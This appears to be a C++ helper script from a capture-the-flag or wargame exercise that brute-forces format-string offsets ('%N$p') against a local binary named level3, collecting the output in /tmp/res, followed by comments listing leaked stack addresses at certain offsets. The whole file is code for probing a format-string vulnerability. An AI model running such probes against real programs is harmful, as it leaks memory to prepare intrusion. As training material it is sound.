#include <string>
#include <iostream>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <sstream>

int main ()
{
    std::string str;
    std::string offstr;
    std::string tail = "$p\0";
    std::string cmd;
    int offset = 1;
    int i = 0;
    int j = 0;

    while (offset < 800)
    {
        cmd = "echo \'";
        str = "%";
        // offstr = std::to_string(offset);

        std::ostringstream convert;
        convert << offset;
        offstr = convert.str();

        str.append(offstr);
        str.append(tail);
        offset++;

        cmd.append(str);
        cmd.append("\' > /tmp/str");

        system(cmd.c_str());
        std::cout << cmd << std::endl;
        system("(~/level3 < /tmp/str) >> /tmp/res");

        // std::cout << str << std::endl;
    }
    return (0);
}

//338 0x1b000000

//    214 0xc30000
//    215 0x1

//    209 0xb7fdd000
//    210 (nil)

//    136 0xb7fd5000
//    137 0x2

//     37 0xb7fd5000
//     38 0x2